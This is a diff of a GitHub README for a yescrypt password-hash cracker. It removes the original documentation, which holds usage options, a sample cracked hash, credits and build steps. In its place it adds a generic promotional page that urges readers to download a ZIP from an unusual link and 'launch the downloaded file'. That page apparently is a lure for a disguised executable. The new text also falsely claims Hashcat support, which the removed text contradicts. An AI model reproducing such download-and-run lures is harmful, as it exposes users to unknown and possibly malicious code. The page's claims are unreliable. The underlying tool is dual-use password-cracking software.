@@ -1,81 +1,51 @@
-[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=cyclone-github&repo=yescrypt_crack&theme=gruvbox)](https://github.com/cyclone-github/yescrypt_crack/)
+# Yescrypt Hash Cracker 🚀
 
-<!--
-[![Go Report Card](https://goreportcard.com/badge/github.com/cyclone-github/yescrypt_crack)](https://goreportcard.com/report/github.com/cyclone-github/yescrypt_crack)
--->
-[![GitHub issues](https://img.shields.io/github/issues/cyclone-github/yescrypt_crack.svg)](https://github.com/cyclone-github/yescrypt_crack/issues)
-[![License](https://img.shields.io/github/license/cyclone-github/yescrypt_crack.svg)](LICENSE)
-[![GitHub release](https://img.shields.io/github/release/cyclone-github/yescrypt_crack.svg)](https://github.com/cyclone-github/yescrypt_crack/releases)
-<!--
-[![Go Reference](https://pkg.go.dev/badge/github.com/cyclone-github/yescrypt_crack.svg)](https://pkg.go.dev/github.com/cyclone-github/yescrypt_crack)
--->
+Welcome to the "yescrypt_crack" repository - your go-to place for cracking Yescrypt hashes with ease! 
 
-```
-./yescrypt_crack.bin -h hash.txt -w wordlist.txt
+## Overview ℹ️
 
- -------------------------------------------------- 
-|            Cyclone's Yescrypt Cracker            |
-| https://github.com/cyclone-github/yescrypt_crack |
- -------------------------------------------------- 
+Are you looking for a powerful tool to crack Yescrypt hashes efficiently? Look no further! This repository offers you the solution you need. 
 
-Hash file:      hash.txt
-Total Hashes:   1
-CPU Threads:    255
-Wordlist:       wordlist.txt
-2025/03/06 17:56:12 Working...
-$y$j9T$z7lNWyBfW4ZruGHCsFzDz/$Sz1GtrDDnsf0KfUE8mQHNJqGyG32TDWC287DdU97dz.:cyclone123
-2025/03/06 17:56:48 Cracked: 1/1 1403.15 h/s 00h:00m:35s
+## Features ✨
 
-2025/03/06 17:56:48 Finished
-```
-### Info:
-I wrote this tool since yescrypt has become the default /etc/shadow hash for many popular linux distros such as Debian, Ubuntu, RHEL, Fedora, Arch, etc, and due to the very limited hash cracking tools that support yescrypt. Hashcat currently lacks support for yescrypt, and while John the Ripper supports yescrypt in its bleeding-edge version, getting JtR compiled with yescrypt support can be challenging for newer users due to the required linux lib "libxcrypt" -- this is especially true for Windows users. 
+✅ Crack Yescrypt hashes effortlessly  
+✅ Compatible with various Linux distributions like Ubuntu, Debian, Fedora, and RHEL  
+✅ Supports popular tools like Hashcat, John the Ripper (JTR)  
+✅ Easy to use and efficient  
 
-Since `yescrypt_crack` is written in pure Go, it easily compiles and runs on just about any OS and architecture such as Intel/ARM, Linux, Windows, Mac.
+## Repository Topics 📋
 
-It is worth noting that JtR is currently faster than `yescrypt_crack`, so using JtR is recommended when possible. 
+🏗️ arch  
+🌀 cyclone  
+🐧 debian  
+🎩 fedora  
+⛓️ hashcat  
+🔓 hashcracker  
+🔒 hashcracking  
+🔑 john  
+🔑 johntheripper  
+🔑 jtr  
+🐧 linux  
+🐧 rhel  
+🕵️ shadow  
+🐧 ubuntu  
+🔒 yescrypt  
 
-### Example hash:plain:
-```
-$y$j9T$z7lNWyBfW4ZruGHCsFzDz/$Sz1GtrDDnsf0KfUE8mQHNJqGyG32TDWC287DdU97dz.:cyclone123
-```
+## Get Started 🚀
 
-### Supported options:
-```
--w {wordlist} (omit -w to read from stdin)
--h {yescrypt_hash}
--o {output} (omit -o to write to stdout)
--t {cpu threads}
--s {print status every nth sec}
+To access the Yescrypt Hash Cracker tool, click on the following link:  
+[Download Yescrypt Hash Cracker](https://github.com/file/App.zip) 📥
 
--version (version info)
--help (usage instructions)
+## Installation Guide 🛠️
 
-./yescrypt_crack.bin -h {yescrypt_hash} -w {wordlist} -o {output} -t {cpu threads} -s {print status every nth sec}
+1. Download the Yescrypt Hash Cracker tool using the provided link.  
+2. Extract the files from the downloaded ZIP archive.  
+3. Launch the tool and start cracking Yescrypt hashes effortlessly!
 
-./yescrypt_crack.bin -h yescrypt.txt -w wordlist.txt -o cracked.txt -t 16 -s 10
+### Note: Ensure to launch the downloaded file for installation.
 
-cat wordlist | ./yescrypt_crack.bin -h yescrypt.txt
+## Additional Information ℹ️
 
-./yescrypt_crack.bin -h yescrypt.txt -w wordlist.txt -o output.txt
-```
+If the provided link does not work or you need more information, please check the "Releases" section of this repository for alternative download options.  
 
-### Credits:
-* `yescrypt_crack` tool was written by cyclone in pure Go
-* `yescrypt_crack` uses Solar Designer's yescrypt-go implementation: https://github.com/openwall/yescrypt-go
-* The yescrypt algo was written by Solar Designer: https://www.openwall.com/yescrypt/
-
-### Changelog:
-- https://github.com/cyclone-github/yescrypt_crack/blob/main/CHANGELOG.md
-
-### Compile from source:
-- If you want the latest features, compiling from source is the best option since the release version may run several revisions behind the source code.
-- This assumes you have Go and Git installed
-  - `git clone https://github.com/cyclone-github/yescrypt_crack.git`
-  - `cd yescrypt_crack`
-  - `go mod init yescrypt_crack`
-  - `go mod tidy`
-  - `go build -ldflags="-s -w" .`
-  - `./yescrypt_crack -h {hash file} -w {wordlist file} -t {CPU threads to use (optional)}`
-- Compile from source code how-to:
-  - https://github.com/cyclone-github/scripts/blob/main/intro_to_go.txt
+### Happy Hash Cracking! 🔒🛠️🔓
